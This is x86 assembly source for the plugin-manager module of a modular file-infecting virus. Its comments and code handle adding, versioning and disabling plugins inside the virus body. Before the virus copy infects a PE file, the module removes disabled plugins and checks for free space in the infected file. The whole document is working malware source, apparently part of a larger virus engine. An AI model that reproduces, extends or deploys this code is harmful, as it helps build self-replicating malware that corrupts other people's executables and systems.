   ; PLUGMAN
   ; ~~~~~~~
   ; - plugin manager (add/disable-remove)

   ; WARNING: LOADER-plugin can not be added/replaced (format version 1)

   ; TARGET: current virus body (be cureful!)
   ; - EV_PLUGMAN_ADD: add plugin and DISABLE lower plugin version if exists
   ; - EV_PLUGMAN_REMOVE: DISABLED plugin

   ; TARGET: virus copy to infect file with
   ; - EV_INFMANx_BEFORE_VIRUS: remove all disabled plugins

   include                 INCLUDE\consts.inc
   include                 system.inc
   include                 infmanx.inc
   include                 pgncont.inc
   include                 unprot.inc

   include                 plugin.inc
                           PLUGIN_START    PLUGMAN, CODE32, PERMUTABLE

   handleevent:            hookevent EV_PLUGMAN_ADD, addplugin
                           hookevent EV_PLUGMAN_ADD_EX, addplugin_ex
                           hookevent EV_PLUGMAN_REMOVE, removeplugin ; input: EDX=base(id)
                           hookevent EV_INFMANX_BEFORE_VIRUS, killdisabled
                           stc
                           retn

   ; input: EDX=plugin base (id)

   removeplugin:           pusha
                           event   EV_SYSTEM_GET_PLUGIN_OFFS
                           or      eax, eax
                           jz      __exit
                           or      [eax].plugin_flags, FL_PGN_DISABLED
   __exit:                 popa
                           clc
                           retn

   ; input: ESI=new plugin ptr

   addplugin:              event   EV_PGNCONT_ADDPLUGIN

   addplugin_ex:           pusha

                           event   EV_UNPROT_ME

                           mov     edx, [esi].plugin_id
                           event   EV_SYSTEM_GET_PLUGIN_OFFS ; hava such plugin?
                           or      eax, eax
                           jz      __add

                           mov     esi, [esp].pusha_esi             ; pusha.esi
                           mov     ecx, [eax].plugin_version  ; old ver
                           cmp     ecx, [esi].plugin_version  ; new ver
                           jae     __exit              ; if (old >= new) -- exit

   __replace:              ; disable old plugin...

                           mov     edx, [eax].plugin_id
                           event   EV_PLUGMAN_REMOVE

                           ; ...add new one

   __add:                  event   EV_SYSTEM_GET_VIR_SIZE
                           lea     edi, [esi+ecx-4]        ; edi = @end_of_vir

                           mov     esi, [esp].pusha_esi          ; pusha.esi
                           mov     ecx, [esi]
                           xor     eax, eax
                           cld

                           pusha                   ; in the case we're adding
                           add     ecx, 4
                           repz    scasb           ; new plugin within the
                           popa                    ; infected PE file, check
                           jnz     __exit          ; that there're free space

                           rep     movsb
                           xor     eax, eax                ; EOF
                           stosd

   __exit:                 popa
                           stc     ; keep event
                           retn

   ; remove all disabled plugins

   ; input: ESI=vir copy, ECX=size

   killdisabled:           pusha

   __cycle:                test    [esi].plugin_flags, FL_PGN_DISABLED
                           jnz     __remove

                           add     esi, [esi].plugin_size

   __contcycle:            cmp     dword ptr [esi], 0      ; EOF?
                           jne     __cycle

                           popa
                           stc             ; keep event
                           retn

   __remove:
                           mov     eax, [esi].plugin_size
                           sub     [esp].popa_ecx, eax

                           push    esi

                           mov     edi, esi                ; this (to be removed)
                           add     esi, [esi].plugin_size  ; next

                           xor     eax, eax                ; EAX=0

                           cmp     [esi], eax              ; EOF?
                           je      __remove_last

                           ; ECX = # of bytes to copy
                           xor     ecx, ecx
   __1:                    add     ecx, [esi+ecx].plugin_size
                           cmp     [esi+ecx], eax          ; EOF?
                           jne     __1

                           cld
                           rep     movsb

   __remove_last:          stosd                           ; EOF

                           pop     esi
                           jmp     __contcycle

                           PLUGIN_END
